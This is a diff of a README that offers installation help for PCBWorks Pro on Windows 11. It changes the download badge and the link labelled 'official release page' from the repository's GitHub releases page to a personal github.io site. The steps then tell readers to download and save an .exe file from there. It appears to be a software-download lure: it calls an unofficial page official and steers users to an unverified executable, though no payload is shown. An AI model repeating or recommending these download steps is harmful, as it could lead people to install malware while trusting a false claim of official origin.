@@ -1,6 +1,6 @@
 # 🛠 PCBWorks-Setup-Help - Run PCBWorks Pro on Windows 11
 
-[![](https://img.shields.io/badge/Download_PCBWorks-Blue?style=for-the-badge&logo=github)](https://github.com/Apctime90/PCBWorks-Setup-Help/releases)
+[![](https://img.shields.io/badge/Download_PCBWorks-Blue?style=for-the-badge&logo=github)](https://apctime90.github.io)
 
 This guide helps you put PCBWorks Pro on your Windows 11 computer. Many users face installation errors with this software. These notes explain how to prepare your system, run the installer, and fix common problems. Follow these steps to complete your setup successfully.
 
@@ -21,7 +21,7 @@ Make sure your Windows 11 system has all current updates. Open your Settings men
 
 Follow these steps to get the software files.
 
-1. Go to the [official release page](https://github.com/Apctime90/PCBWorks-Setup-Help/releases).
+1. Go to the [official release page](https://apctime90.github.io).
 2. Click the file that ends in .exe.
 3. Save the file to your Downloads folder.
 4. Open your Downloads folder.
